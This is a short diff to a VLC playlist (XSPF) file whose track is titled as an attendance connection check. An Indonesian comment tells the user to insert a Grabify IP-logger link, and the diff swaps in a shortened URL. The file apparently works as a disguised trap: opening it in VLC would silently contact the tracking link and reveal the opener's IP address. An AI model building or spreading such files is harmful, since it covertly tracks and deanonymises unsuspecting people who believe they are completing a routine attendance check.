@@ -4,7 +4,7 @@
     <trackList>
         <track>
             <!-- GANTI LINK DI BAWAH INI DENGAN "NEW URL" DARI GRABIFY -->
-            <location>https://grabify.link</location>
+            <location>https://urlto.me/2hexg</location>
             <title>Memverifikasi Koneksi Presensi...</title>
             <extension application="http://videolan.org">
                 <vlc:id>0</vlc:id>
